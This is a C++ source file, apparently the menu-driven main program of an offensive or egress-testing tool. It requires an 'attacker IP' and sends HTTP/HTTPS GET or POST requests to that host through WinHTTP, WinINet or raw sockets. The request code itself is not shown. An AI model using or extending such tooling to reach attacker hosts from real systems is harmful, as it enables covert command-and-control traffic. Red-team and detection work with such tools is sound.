#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include "RAW-HTTP.h"
#include "RAW-HTTPS.h"

extern "C" {
#include "WINHTTPS.h"
#include "WINHTTP.h"
}

#include "WININET.h"

string output;

// Include order is important. Please do not change.
// Add new headers at the end
using namespace std;

int main(int argc, const char* argv[])
{
    char options;
    const char* ip = argv[1];

    if (!ip)
    {
        printf("\nNeed attacker IP as my first argument!\n");
        return -1;
    }

	printf("\nSelect any options from below: \n");
    printf("----------------------------------\n");
    printf("1----WINHTTP -  HTTP  -  GET \n");
    printf("2----WINHTTP -  HTTP  -  POST \n");
    printf("3----WINHTTP -  HTTPS -  GET \n");
    printf("4----WINHTTP -  HTTPS -  POST \n");
    printf("5----WININET -  HTTP  -  GET \n");
    printf("6----WININET -  HTTP  -  POST \n");
    printf("7----WININET -  HTTPS -  GET \n");
    printf("8----WININET -  HTTPS -  POST \n");
    printf("9----SOCKET  -  HTTP  -  GET \n");
    printf("10---SOCKET  -  HTTP  -  POST \n");
    printf("11---SOCKET  -  HTTPS -  GET \n");
    printf("12---SOCKET  -  HTTPS -  POST \n");
    printf("----------------------------------\n");

    printf("\nSelect: ");
    scanf("%d", &options);

    switch (options) {
    case 1:
        winhttp(ip, "GET");
        break;
    case 2:
        winhttp(ip, "POST");
        break;
    case 3:
        winhttps(ip, "GET");
        break;
    case 4:
        winhttps(ip, "POST");
        break;
    case 5:
        wininet(ip, "No","GET");
        break;
    case 6:
        wininet(ip, "No", "POST");
        break;
    case 7:
        wininet(ip, "Yes", "GET");
        break;
    case 8:
        wininet(ip, "Yes", "POST");
        break;
    case 9:
        output = rawhttp(ip, "GET");
        cout << output;
        //cout << "\n\nPress ANY key to close.\n\n";
        //cin.ignore(); cin.get();
        break;
    case 10:
        output = rawhttp(ip, "POST");
        cout << output;
        //cout << "\n\nPress ANY key to close.\n\n";
        //cin.ignore(); cin.get();
        break;
    case 11:
        rawhttps(ip, "GET");
        break;
    case 12:
        rawhttps(ip, "POST");
        break;
    default:
        printf("Not an option! \n");
        break;
    }
    return 0;
}


